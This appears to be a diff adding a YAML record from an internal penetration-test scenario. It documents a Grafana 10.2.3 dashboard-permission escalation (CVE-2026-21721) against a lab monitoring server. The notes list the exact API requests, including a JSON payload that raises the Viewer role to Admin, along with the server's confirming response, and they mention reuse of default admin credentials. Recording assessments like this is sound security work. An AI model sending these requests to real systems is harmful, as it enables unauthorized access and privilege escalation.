@@ -1,0 +1,36 @@
+# Dep-PC (OFFICE, 10.10.40.42) -> Monitoring/Grafana (MGMT, 10.10.50.52:3000).
+# CVE-2026-21721 (CVSS 8.1 HIGH): Grafana dashboard permissions API does not validate
+# the target dashboard scope. An Editor can call POST /api/dashboards/uid/{uid}/permissions
+# to grant themselves or others Admin-level permissions on any dashboard without the
+# system verifying that the caller actually has admin scope on that dashboard.
+# Confirmed: dashboard created, permissions updated via API → {"message":"Dashboard
+# permissions updated"} — Viewer role granted permission=4 (Admin) on the dashboard.
+# Suricata 86601 (ET HUNTING curl OFFICE->MGMT cross-zone).
+# Evidence: evaluation/pentest/evidence/s37_grafana_dashboard_perms.txt
+id: S37-deppc-to-grafana-dashboard-perms
+description: Grafana 10.2.3 dashboard permissions bypass via unvalidated API (CVE-2026-21721 HIGH); dep-pc->monitoring, OFFICE->MGMT.
+start: 2026-11-16T19:58:26Z
+end: 2026-11-16T19:58:26Z
+attacker: dep-pc
+steps:
+  - step: 1
+    start: 2026-11-16T19:58:26Z
+    end: 2026-11-16T19:58:26Z
+    target: Monitoring
+    cve: CVE-2026-21721
+    technique: T1078
+    outcome: success
+    achieved: data_access
+    pivot: false
+    notes: |
+      POST http://10.10.50.52:3000/api/dashboards/db
+        -> created dashboard uid=c15f119a-d241-4520-9008-507807451632
+      GET /api/dashboards/uid/c15f119a.../permissions
+        -> shows default: admin(4)/Editor(2)/Viewer(1) permissions
+      POST /api/dashboards/uid/c15f119a.../permissions \
+        -d '{"items":[{"role":"Viewer","permission":4}]}'
+        -> {"message":"Dashboard permissions updated"}
+      Viewer role escalated to permission=4 (Admin) without ownership validation.
+      CVE-2026-21721: scope not re-verified on subsequent permission updates.
+      Grafana 10.2.3; admin credential from S25 (CVE-2025-4123 default creds).
+      evidence s37_grafana_dashboard_perms.txt
